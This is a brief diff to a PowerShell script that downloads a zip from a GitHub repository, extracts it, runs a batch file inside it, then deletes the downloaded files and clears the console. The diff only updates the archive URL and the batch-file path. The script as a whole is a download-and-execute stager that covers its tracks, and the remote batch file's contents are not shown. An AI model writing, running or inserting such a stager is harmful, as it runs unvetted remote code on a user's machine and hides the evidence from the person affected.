@@ -1,10 +1,10 @@
 $w=$home
-$u="https://github.com/3lv/a/archive/main.zip"
+$u="https://github.com/3lv/a/archive/a.zip"
 $z="$w\a.zip"
 $d="$w\a\"
 (New-Object System.Net.WebClient).DownloadFile($u,$z)
 Expand-Archive $z $d -F
 cd $d\..
-.\a\a-main\a.bat
+.\a\a-a\a.bat
 Remove-Item $z,$d -R -F
 cls
